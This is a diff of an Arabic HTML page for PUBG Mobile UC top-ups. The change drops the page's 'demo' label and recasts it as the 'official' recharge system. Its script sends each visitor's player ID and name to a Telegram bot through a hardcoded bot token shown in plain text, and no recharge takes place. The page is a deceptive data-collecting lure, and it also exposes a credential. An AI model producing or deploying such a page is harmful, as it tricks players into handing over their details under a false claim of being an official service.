@@ -1,52 +1,116 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>شحن ببجي (تجريبي)</title>
+<title>🎮 شحن شدات ببجي | PUBGM UC</title>
+
+<!-- Google Fonts -->
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+
 <style>
   body {
-    background: url('https://wallpapercave.com/wp/wp10223146.jpg') no-repeat center center fixed;
-    background-size: cover;
-    font-family: 'Cairo', sans-serif;
-    color: white;
+    margin: 0;
+    padding: 0;
+    font-family: 'Tajawal', sans-serif;
+    background: radial-gradient(circle at top, #0f2027, #203a43, #2c5364);
+    color: #fff;
     text-align: center;
+    overflow-x: hidden;
   }
+
+  header {
+    background: rgba(0, 0, 0, 0.5);
+    padding: 20px;
+    box-shadow: 0 0 15px rgba(255,255,255,0.1);
+  }
+
+  header h1 {
+    font-size: 2em;
+    color: gold;
+    margin: 0;
+  }
+
   .container {
-    background: rgba(0,0,0,0.7);
-    padding: 25px;
+    background: rgba(255,255,255,0.08);
+    padding: 40px 20px;
+    border-radius: 20px;
+    max-width: 420px;
     margin: 60px auto;
-    border-radius: 15px;
-    width: 90%;
-    max-width: 400px;
+    box-shadow: 0 0 20px rgba(255,255,255,0.1);
+    animation: fadeIn 1s ease;
   }
-  input, button {
+
+  @keyframes fadeIn {
+    from {opacity: 0; transform: translateY(30px);}
+    to {opacity: 1; transform: translateY(0);}
+  }
+
+  input {
     width: 90%;
-    padding: 10px;
-    margin: 10px;
+    padding: 12px;
+    margin: 10px 0;
     border-radius: 10px;
     border: none;
+    outline: none;
     font-size: 16px;
+    text-align: center;
   }
+
+  input:focus {
+    box-shadow: 0 0 10px gold;
+  }
+
   button {
-    background: gold;
+    width: 90%;
+    padding: 12px;
+    border-radius: 10px;
+    background: linear-gradient(90deg, gold, orange);
+    border: none;
     color: black;
+    font-size: 18px;
     font-weight: bold;
     cursor: pointer;
+    transition: 0.3s;
   }
-  #status { margin-top: 15px; font-size: 18px; }
+
+  button:hover {
+    transform: scale(1.05);
+    background: linear-gradient(90deg, orange, gold);
+  }
+
+  footer {
+    margin-top: 50px;
+    font-size: 14px;
+    color: #aaa;
+  }
+
+  #status {
+    margin-top: 15px;
+    font-weight: bold;
+    font-size: 16px;
+  }
 </style>
 </head>
 <body>
+
+  <header>
+    <h1>🎮 نظام شحن شدات ببجي الرسمي</h1>
+    <p>ادخل معلوماتك الصحيحة لتأكيد العملية</p>
+  </header>
+
   <div class="container">
-    <h1>🎮 شحن شدات ببجي (تجريبي)</h1>
     <form id="pubgForm">
       <input type="text" id="playerId" placeholder="أدخل ID اللاعب" required>
       <input type="text" id="playerName" placeholder="اسم اللاعب (اختياري)">
-      <button type="submit">شحن الآن ⚡</button>
+      <button type="submit">⚡ تأكيد عملية الشحن</button>
     </form>
     <div id="status"></div>
   </div>
+
+  <footer>
+    Ⓒ 2025 جميع الحقوق محفوظة | تصميم <span style="color: gold;">Jasser</span>
+  </footer>
 
   <script>
   const BOT_TOKEN = "7917070284:AAG6dAMr4QeVDeoAtpltPsEbqpG3WXiOKpI";
@@ -58,7 +122,7 @@
     const playerId = document.getElementById("playerId").value.trim();
     const playerName = document.getElementById("playerName").value.trim();
     const text = `🎯 طلب شحن جديد:\n🆔 ID: ${playerId}\n👤 الاسم: ${playerName || "(غير مُدخل)"}\n🌐 المصدر: ${location.href}`;
-    
+
     const res = await fetch(API_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -66,12 +130,15 @@
     });
 
     if(res.ok){
-      document.getElementById("status").textContent = "✅ تم الإرسال إلى بوت التلغرام!";
+      document.getElementById("status").textContent = "✅ تم إرسال البيانات بنجاح إلى البوت!";
+      document.getElementById("status").style.color = "lime";
       document.getElementById("pubgForm").reset();
     } else {
       document.getElementById("status").textContent = "❌ فشل الإرسال، حاول مجددًا.";
+      document.getElementById("status").style.color = "red";
     }
   });
   </script>
+
 </body>
 </html>
